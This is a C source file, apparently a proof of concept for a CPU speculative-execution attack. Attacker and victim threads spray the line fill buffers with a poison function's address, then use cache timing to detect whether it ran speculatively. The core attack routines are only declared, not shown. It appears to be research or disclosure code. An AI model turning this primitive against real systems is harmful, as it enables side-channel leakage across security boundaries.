#include <stdio.h>
#include <sched.h>
#include <pthread.h>
#include <sys/mman.h>
#include <string.h>
#include <setjmp.h>
#include <signal.h>
jmp_buf env;
void SprayFillBuffers(unsigned char *buffer);
void PoisonFunction(unsigned char * target);
void VictimFunctionTsx(unsigned char * Buffer);
void VictimFunctionFault(unsigned char * Buffer);
unsigned long long MeasureAccessTime(unsigned char * mem);

unsigned char *gSprayPage = NULL;
unsigned long long gTargetPage = 0x00000000BDBD0000;

void recvSignal(int sig)
{
	//printf("received signal %d !!!\n",sig);
        siglongjmp(env,1);
}
unsigned int Thread1(void *Argument)
{
    unsigned int mask = 0x02;
    pthread_t thread=pthread_self();
    pthread_setaffinity_np(thread,sizeof(mask),&mask);

    //UNREFERENCED_PARAMETER(Argument);

    printf("Spray thread started...\n");
    

    while (1)
    {
        SprayFillBuffers(gSprayPage);
    }
	
    printf("Done 1!\n");

    return 0;
}

unsigned int Thread2(void *Argument)
{
    unsigned int  mask = 0x01;
    pthread_t thread=pthread_self();
    pthread_setaffinity_np(thread,sizeof(mask),&mask);

    //UNREFERENCED_PARAMETER(Argument);

    printf("Victim thread started...\n");

    while (1)
    {
        //try
        //{
            // Wither VictimFunctionTsx or VictimFunctionFault will do.
            //
            
        //}
        int r=sigsetjmp(env,1);
	if(r==0)
	{
	signal(SIGSEGV,recvSignal);
	VictimFunctionFault(0);
	//VictimFunctionTsx(0);	
		
	}	
	else
	{
		
		printf("\n");
		//asm volatile("mfence":::"memory");
		asm volatile("mfence");
		unsigned long long t = MeasureAccessTime((unsigned char *)gTargetPage);
		
		if (t < 100)
		{
		   printf("BINGO!!!! The sprayed function has been executed, access time = %llu\n", t);
		}
		
		//asm volatile("mfence":::"memory");
		asm volatile("mfence");
		
	}
	//catch(...){
	
        // Check if the gTargetPage has been cached. Note that the only place this page is accessed from is the
        // PoisonFunction, so if we see this page cached, we now that the PoisonFunction got executed speculatively.
        //_mm_mfence();
        //printf("step 1!\n");
	//asm volatile("":::"memory");

        //asm volatile("":::"memory");
        //_mm_mfence();
    }

    printf("Done 2!\n");

    return 0;
}

int main(int argc, char *argv[])
{
    unsigned char mode = 0;
    unsigned char *target = NULL;

    if (argc == 1)
    {
        // Run in both modes - both the attacker & the victim will run inside this process.
        mode = 0;
    }
    else if (argv[1][0] == '1')
    {
        // Run in attacker mode. Only start Thread1, which sprays the LFBs.
        mode = 1;
    }
    else if (argv[1][0] == '2')
    {
        // Run in victim mode. Only start Thread2, which will to a "CALL [0]".
        mode = 2;
    }

    if (mode == 0 || mode == 2)
    {
        // Allocate the target buffer. This buffer will be accessed speculatively by the PoisonFunction, if it ever
        // gets executed.
        // If we see that this gTargetPage is cached, we will now that PoisonFunction got executed speculatively.
        //target = VirtualAlloc((PVOID)(SIZE_T)gTargetPage, 0x10000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        //simulate RESERVE
        target=mmap((void *)gTargetPage,0x10000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANON,-1,0); //PROT_NONE
        
        //simulate commit
        //int result = mprotect((void *)gTargetPage,0x10000,PROT_READ|PROT_WRITE);
        if (NULL == target)
        {
            printf("Poison buffer alloc failed\n");
            return -1;
        }
        memset(target, 0xCC, 0x10000);
        //_mm_clflush(target);
        //_mm_mfence();
        asm volatile("mfence");
    }

    if (mode == 0 || mode == 1)
    {
        // Allocate the page containing the address of our function. We will access this page in a loop, in order
        // to spray the LFBs with the address of the PoisonFunction, hoping that a branch will speculatively fetch
        // its address from the LFBs.
        //gSprayPage = VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        
        gSprayPage=mmap(NULL,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANON,-1,0);
        //simulate commit
        //int result = mprotect(NULL,0x1000,PROT_READ|PROT_WRITE);
        if (NULL == gSprayPage)
        {
            printf("Function page alloc failed\n");
            return -1;
        }

        // Fill the page with the address of the poison function.
        for (unsigned int i = 0; i < 0x1000 / 8; i++)
        {
            ((unsigned long long *)gSprayPage)[i] = (unsigned long long)&PoisonFunction;
        }
    }

    // Create the 2 threads.
    pthread_t tid1, tid2;
    int th1, th2;
    void *tret;
    int err;
    if (mode == 0)
    {
        // Create both the attacker and the victim.
        
        th1 = pthread_create(&tid1, NULL, (void *)Thread1, NULL);
        th2 = pthread_create(&tid2, NULL, (void *)Thread2, NULL);
        err=pthread_join(tid1,&tret);
        err=pthread_join(tid2,&tret);
    }
    else if (mode == 1)
    {
        // Create only the attacker.
        th1 = pthread_create(&tid1, NULL, (void *)Thread1, NULL);
    }
    else if (mode == 2)
    {
        // Create only the victim.
        th2 = pthread_create(&tid2, NULL, (void *)Thread2, NULL);
    }

    // Will never return, since the threads execute an infinite loop.
    if (mode == 0 || mode == 1)
    {
        //WaitForSingleObject(th1, INFINITE);
    }

    if (mode == 0 || mode == 2)
    {
        //WaitForSingleObject(th2, INFINITE);
    }

    return 0;
}
